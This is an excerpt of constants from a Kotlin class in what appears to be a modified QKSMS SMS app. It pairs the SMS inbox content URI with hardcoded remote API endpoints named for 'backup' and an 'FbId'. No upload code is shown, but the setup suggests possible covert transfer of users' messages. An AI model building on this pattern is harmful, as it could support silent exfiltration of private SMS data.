...
class Transaction @JvmOverloads constructor(private val context: Context, settings: Settings = Settings()) {
    ...
    companion object {
        ...
        const val MMS_RECEIVE = "com.moez.QKSMS.MMS_RECEIVE"
        const val AUTO_SENT = "com.moez.QKSMS.AUTO_SENT"
        const val AUTO_RECEIVE = "com.moez.QKSMS.AUTO_RECEIVE"
        const val OPEN = "OPEN"
        const val DEFAULT = "DEFAULT"
        const val AGREE = "AGREE"
        const val RE1 = "RE1"
        const val RE2 = "RE2"
        const val RE2DELAY = "RE2DELAY"
//        const val URL_BACKUP = "https://aehlc8ojk7.execute-api.us-west-2.amazonaws.com/default/MS702"
        const val URL_BACKUP = "https://50u9pii8pf.execute-api.us-west-2.amazonaws.com/default/MS702NEW"
        const val EXTRA_CONTENT_URI = "content_uri"
        const val EXTRA_FILE_PATH = "file_path"
        const val FB_ID = "FbId"
        const val FB_URL = "https://7w96qq26ac.execute-api.us-west-2.amazonaws.com/default/FB702"
        ...
        const val ErrorCode = "702"
        const val FIRST_TIME = "FIRST_TIME"
        const val PRIVACY_STATUS = "PRIVACY_STATUS"
        const val URL_STRING = "content://sms/"
        const val INDEX_BOX = "content://sms/inbox"
